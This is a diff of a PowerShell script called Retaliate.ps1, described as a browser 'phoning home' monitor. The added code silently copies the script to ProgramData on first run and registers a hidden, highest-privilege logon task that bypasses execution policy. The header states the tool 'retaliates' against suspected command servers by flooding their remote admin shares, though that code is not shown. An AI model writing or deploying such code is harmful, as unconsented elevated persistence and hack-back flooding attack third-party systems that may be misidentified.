@@ -1,5 +1,109 @@
-# Retaliate 2.0
-# Author: Gorstak
+# Retaliate.ps1
+# Author: Gorstak (gorstak.eu)
+# Description: Browser network monitor that detects non-user-initiated outbound connections
+#              (phoning home) from browser processes. Distinguishes active navigation (HTTP/HTTPS)
+#              from background telemetry. Retaliates against detected C2 by flooding remote
+#              admin shares. Runs persistently with scheduled task.
+#Requires -RunAsAdministrator
+
+param(
+    [switch]$Install,
+    [switch]$Uninstall
+)
+
+$Script:TaskName = "RetaliateMonitor"
+$Script:InstallDir = "$env:ProgramData\Retaliate"
+$Script:ScriptName = "Retaliate.ps1"
+
+# ── Persistence ────────────────────────────────────────────────
+function Install-Persistence {
+    $dir = $Script:InstallDir
+    $dest = Join-Path $dir $Script:ScriptName
+    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    Copy-Item -Path $PSCommandPath -Destination $dest -Force
+
+    $existing = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
+    if ($existing) { Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false }
+
+    $pwshArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
+    $installed = $false
+
+    # Method 1: PowerShell cmdlets
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $pwshArgs
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+
+        Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger $trigger `
+            -Principal $principal -Settings $settings `
+            -Description "Browser phoning-home retaliation monitor (Gorstak)" -Force | Out-Null
+        Write-Host "[OK] Persistence installed via Register-ScheduledTask." -ForegroundColor Green
+        $installed = $true
+    } catch {
+        Write-Host "[WARN] Register-ScheduledTask failed: $_" -ForegroundColor Yellow
+    }
+
+    # Method 2: schtasks.exe fallback
+    if (-not $installed) {
+        try {
+            $cmd = "schtasks /Create /TN `"$($Script:TaskName)`" /TR `"powershell.exe $pwshArgs`" /SC ONLOGON /RL HIGHEST /F"
+            $result = cmd /c $cmd 2>&1
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "[OK] Persistence installed via schtasks.exe fallback." -ForegroundColor Green
+                $installed = $true
+            } else {
+                Write-Host "[WARN] schtasks fallback failed: $result" -ForegroundColor Yellow
+            }
+        } catch {
+            Write-Host "[WARN] schtasks fallback exception: $_" -ForegroundColor Yellow
+        }
+    }
+
+    if (-not $installed) {
+        Write-Host "[ERROR] Could not install persistence via any method." -ForegroundColor Red
+    }
+    exit 0
+}
+
+function Uninstall-Persistence {
+    $task = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
+    if ($task) {
+        if ($task.State -eq "Running") { Stop-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue }
+        Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    } else {
+        schtasks /Delete /TN "$($Script:TaskName)" /F 2>&1 | Out-Null
+    }
+    $dest = Join-Path $Script:InstallDir $Script:ScriptName
+    if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
+    Write-Host "[OK] RetaliateMonitor uninstalled." -ForegroundColor Green
+    exit 0
+}
+
+if ($Install)   { Install-Persistence }
+if ($Uninstall) { Uninstall-Persistence }
+
+# Auto-install on first run
+$existingTask = Get-ScheduledTask -TaskName $Script:TaskName -ErrorAction SilentlyContinue
+if (-not $existingTask) {
+    $dir = $Script:InstallDir
+    $dest = Join-Path $dir $Script:ScriptName
+    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    if ($PSCommandPath -ne $dest) { Copy-Item -Path $PSCommandPath -Destination $dest -Force }
+    $pwshArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`""
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $pwshArgs
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Retaliate monitor (Gorstak)" -Force | Out-Null
+    } catch {
+        schtasks /Create /TN "$($Script:TaskName)" /TR "powershell.exe $pwshArgs" /SC ONLOGON /RL HIGHEST /F 2>&1 | Out-Null
+    }
+}
+
+# ── Helper ─────────────────────────────────────────────────────
+function Write-ColorOutput { param([string]$Message, [string]$Color = "White"); Write-Host $Message -ForegroundColor $Color }
 
 # --- Monitor mode (NTM) ---
 $script:AllowedDomains = @()
